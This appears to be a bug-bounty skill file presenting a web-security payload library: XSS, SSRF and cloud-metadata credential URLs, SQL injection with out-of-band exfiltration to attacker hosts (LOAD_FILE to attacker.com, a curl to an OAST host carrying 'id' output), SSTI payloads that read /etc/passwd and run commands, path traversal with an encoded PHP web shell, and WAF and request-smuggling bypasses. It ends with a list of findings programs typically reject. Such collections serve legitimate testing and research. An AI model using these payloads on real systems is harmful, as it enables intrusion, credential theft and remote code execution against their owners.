---
name: k1nzr3c0n-security-arsenal
description: "Security payload library and reference arsenal. Curated payloads for: XSS (30+), SSRF (IP bypass), SQLi (time-blind), SSTI (polyglot), IDOR parameter names, path traversal, HTTP smuggling, WebSocket, MFA bypass, SAML injection. WAF bypass tables. gf pattern names. Always-rejected list."
tags: [payloads, arsenal, reference, web-security, bug-bounty]
---

# K1NZR3C0N Security Arsenal — Payload Library

> **Context**: payloads are references. Always adapt to target's response and encoding.
> **Marker discipline**: replace generic strings with 8-char alphanumeric marker.

---

## Section 1 — XSS Payloads

```bash
echo "=== XSS Payload Reference ==="
cat << 'PAYLOADS'
# Basic
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>

# Attribute injection (no brackets)
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
' onmouseover='alert(1)

# Event handlers
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

# Encoded/obfuscated
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=alert(1)>
<script>eval(atob('YWxlcnQoMSk='))</script>

# DOM XSS (fragment-based)
#<img src=x onerror=alert(1)>
javascript:alert(1)

# WAF bypass
<ScRiPt>alert(1)</ScRiPt>
<script/src=data:,alert(1)>
<img src="x:x" onerror="alert(1)">
<svg><script>alert&lpar;1&rpar;</script>
<iframe srcdoc="<script>alert(1)</script>">
<a href="data:text/html,<script>alert(1)</script>">click</a>

# CSP bypass (JSONP)
<script src="https://TARGET/api/jsonp?callback=alert(1)"></script>
<script src="https://TRUSTED-CDN/angular/1.1.3/angular.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

# jQuery template injection
{{constructor.constructor('alert(1)')()}}
{{7*7}}  (→ 49 = SSTI too)

# Marker: replace alert(1) with: alert(document.domain+';MARKER8C')
PAYLOADS
```

## Section 2 — SSRF IP Bypass Techniques

```bash
echo "=== SSRF IP Bypass Payloads ==="
cat << 'SSRF'
# Target: 127.0.0.1 / localhost

# Decimal encoding
http://2130706433/                  # 127.0.0.1 as integer
http://0x7f000001/                  # hex
http://0177.0.0.1/                  # octal

# Alternative localhost representations
http://localhost/
http://127.1/
http://127.0.1/
http://[::1]/                       # IPv6 loopback
http://[0:0:0:0:0:0:0:1]/

# DNS rebinding / wildcard DNS
http://127.0.0.1.nip.io/
http://foo.127.0.0.1.xip.io/
http://localtest.me/

# Redirect chain
http://REDIRECT-SERVER/?url=http://127.0.0.1/

# URL parsing confusion
http://evil.com#@127.0.0.1/
http://127.0.0.1%2523@evil.com/
http://evil.com\.127.0.0.1/

# AWS metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/dynamic/instance-identity/document

# GCP metadata
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/    # same IP, different path

# Azure metadata
http://169.254.169.254/metadata/instance?api-version=2020-09-01

# Internal CNAME trick
# Create DNS: internal.evil.com CNAME 169.254.169.254
http://internal.evil.com/
SSRF
```

## Section 3 — SQLi Payloads

```bash
echo "=== SQLi Payload Reference ==="
cat << 'SQLI'
# Error-based detection
'
''
`
')
'))
' OR 1=1--
" OR 1=1--
' OR 1=1#
' OR '1'='1

# Time-based blind (MySQL)
' AND SLEEP(5)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
' AND IF(1=1,SLEEP(5),0)--

# Time-based blind (PostgreSQL)
'; SELECT pg_sleep(5)--
' AND 1=(SELECT 1 FROM pg_sleep(5))--

# Time-based blind (MSSQL)
'; WAITFOR DELAY '0:0:5'--

# Time-based blind (Oracle)
' AND 1=1 AND (SELECT COUNT(*) FROM all_tables WHERE 1=dbms_pipe.receive_message(('m'),5))--

# UNION detection (find column count)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

# OOB DNS (when no output channel)
# MySQL
LOAD DATA LOCAL INFILE 'http://OAST/test'
' AND LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\x'))--

# PostgreSQL OOB
'; COPY (SELECT $$whoami$$) TO PROGRAM 'curl http://OAST/?q=$(id)'--

# Filter bypass
' oR '1'='1  (case variation)
'/**/OR/**/1=1--   (comment padding)
'%09OR%091=1--     (tab instead of space)
'%0aOR%0a1=1--     (newline)
SQLI
```

## Section 4 — SSTI Polyglot + Engine Probes

```bash
echo "=== SSTI Payload Reference ==="
cat << 'SSTI'
# Detection polyglot (triggers all major engines)
{{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}

# Jinja2 (Python Flask/Django)
{{7*7}}            → 49 confirms
{{config}}         → config object dump
{{request.environ}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{request.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# Freemarker (Java)
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex("id")}

# ERB (Ruby)
<%= 7*7 %>
<%= `id` %>
<%= system("curl http://OAST/") %>

# Velocity (Java)
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))

# Smarty (PHP)
{$smarty.version}
{system('id')}
{php}echo `id`;{/php}

# Twig (PHP)
{{7*7}}
{{_self.env.getExtension('Twig_Extension_Debug').dump(app)}}
{{app.request.server.all|join(',')}}
SSTI
```

## Section 5 — IDOR Parameter Names

```bash
echo "=== Common IDOR Parameter Names ==="
cat << 'IDOR'
# Numeric ID parameters
id, user_id, userId, account_id, accountId, customer_id, customerId
order_id, orderId, invoice_id, document_id, report_id, record_id
profile_id, profileId, resource_id, resourceId, entity_id

# UUID parameters
uuid, user_uuid, token, access_token, ref, reference

# Encoded / obfuscated
uid, oid, pid, rid, sid, cid, did, fid, gid

# Path parameters (REST)
/api/v1/users/{id}
/api/v1/accounts/{id}
/api/v1/orders/{id}
/api/v1/messages/{id}
/api/v1/files/{id}
/api/v1/documents/{id}

# GraphQL global IDs (base64)
# User:12345 → base64 → VXNlcjoxMjM0NQ==
node(id: "VXNlcjoxMjM0NQ==")

# Test: IDOR needs two distinct accounts proving cross-account access
IDOR
```

## Section 6 — Path Traversal Payloads

```bash
echo "=== Path Traversal Payloads ==="
cat << 'LFI'
# Basic
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
....//....//....//etc/passwd
..\..\..\windows\win.ini

# URL-encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd

# Double-encoded
%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Null byte (PHP < 5.3.4)
../../../etc/passwd%00.jpg

# Path normalization bypass
/var/www/html/../../../etc/passwd
/./././etc/passwd

# Windows targets
..\..\..\windows\system32\drivers\etc\hosts
%WINDIR%\win.ini

# PHP wrappers
php://filter/convert.base64-encode/resource=/etc/passwd
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
expect://id
LFI
```

## Section 7 — WAF Bypass Quick Reference

```bash
echo "=== WAF Bypass Table ==="
cat << 'WAF'
# Case variation
<ScRiPt>alert(1)</ScRiPt>
SELECT → SeLeCt, sElEcT, SELECT

# Comment padding (SQLi)
SELECT/**/version/**/FROM/**/users
SE/**/LECT ver/**/sion FROM users

# Encoding
HTML entities: &#x61;&#x6C;&#x65;&#x72;&#x74; = alert
Unicode: select = select
URL double-encode: %2527 = %27 = '

# HTTP parameter pollution
?id=1&id=2 UNION SELECT 1,2,3--

# Chunked encoding (bypass body inspection)
Transfer-Encoding: chunked

# HTTP/2 header injection (some WAFs inspect HTTP/1 only)
Use HTTP/2 via Burp → change Connection type

# Content-Type bypass (some WAFs only inspect certain types)
application/x-www-form-urlencoded → application/json
application/json → text/plain

# Newline injection (request smuggling to bypass body limit)
Transfer-Encoding: chunked\r\nTransfer-Encoding: cow
WAF
```

## Section 8 — gf Pattern Names

```bash
echo "=== GF Pattern Names (grep for vulnerable params) ==="
cat << 'GF'
gf xss           → parameters often injectable with XSS
gf sqli          → SQL injection parameters
gf ssrf          → potential SSRF vectors
gf redirect      → open redirect parameters
gf lfi           → local file inclusion patterns
gf rce           → RCE via shell metacharacters
gf ssti          → SSTI parameters
gf debug_logic   → debug/test/internal endpoints
gf secrets       → hardcoded secrets in JS
gf cors          → CORS headers in response
gf idor          → id/user_id/account_id parameters
gf interestingparams → generic interesting parameter names

# Install: go install github.com/tomnomnom/gf@latest
# Patterns: https://github.com/tomnomnom/gf
# Extra patterns: https://github.com/1ndianl33t/Gf-Patterns
GF
```

## Section 9 — Always-Rejected List

```bash
echo "=== Never Submit Standalone (always-rejected) ==="
cat << 'REJECT'
NEVER submit alone (need additional impact to be reportable):
  - CORS wildcard (*) without credentialed request working
  - Self-XSS (only affects yourself)
  - Logout CSRF (user must already be authenticated + low impact)
  - Open redirect (standalone, no phishing/OAuth chain)
  - Missing security headers (X-Frame-Options, X-Content-Type, etc.)
  - Clickjacking without sensitive action on framed page
  - Username enumeration via response timing alone (no significant difference)
  - Rate limit missing on non-critical endpoints (health check, public search)
  - Version disclosure without demonstrated exploitability
  - Mixed content (HTTP resources on HTTPS page) — low impact alone
  - SPF/DMARC misconfiguration (email spoofing) on non-login domains
  - SSL/TLS issues (weak ciphers, expired cert) — informational only
  - Missing HSTS on subdomain
  - Tabnapping (target="_blank" without rel="noopener")
  - HTML injection without JS execution (when CSP blocks script)
  - Reflected file download without convincing attack scenario
  - Cache control headers on non-sensitive pages
  - Directory listing on non-sensitive paths (/, /assets/, /static/)
REJECT
```
